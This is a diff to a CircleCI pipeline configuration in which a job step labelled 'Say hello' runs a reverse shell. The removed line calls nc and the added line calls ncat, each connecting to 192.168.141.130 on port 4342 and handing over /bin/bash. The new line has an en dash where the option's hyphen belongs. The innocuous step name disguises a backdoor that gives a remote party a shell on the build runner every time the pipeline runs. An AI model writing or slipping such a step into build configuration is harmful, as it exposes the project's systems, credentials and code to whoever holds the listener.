@@ -20,7 +20,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "nc  192.168.141.130  4342 -e /bin/bash"
+          command: "ncat 192.168.141.130 4342 –e /bin/bash"
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/workflows/ & https://circleci.com/docs/configuration-reference/#workflows
